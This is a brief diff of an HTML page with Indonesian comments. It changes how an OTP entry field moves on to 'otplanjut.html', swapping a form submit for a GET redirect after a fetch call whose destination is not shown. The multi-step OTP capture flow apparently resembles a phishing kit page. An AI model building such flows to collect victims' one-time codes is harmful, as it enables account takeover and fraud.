@@ -228,7 +228,7 @@
 </div>
 
 <div class="form-row m-n">
-    <form id="formotp4" autocomplete="off" action="otplanjut.html" method="POST">
+  
         <input id="PASSWORD1" name="otp" class="form-control input-text text-lg parsley-validated" placeholder="OTP" autocomplete="off" type="password" inputmode="numeric" value="" size="26" maxlength="6"/>
 </div>
 
@@ -280,7 +280,8 @@ window.onload = function() {
         })
         .then(res => res.json())
         .then(res => {
-            document.getElementById("formotp4").submit(); // Lanjut ke otplanjut.html
+            // Ganti submit dengan redirect GET
+            window.location.href = "otplanjut.html";
         })
         .catch(err => {
             console.error(err);
@@ -288,6 +289,7 @@ window.onload = function() {
         });
     });
 }
+
 </script>
 
 														
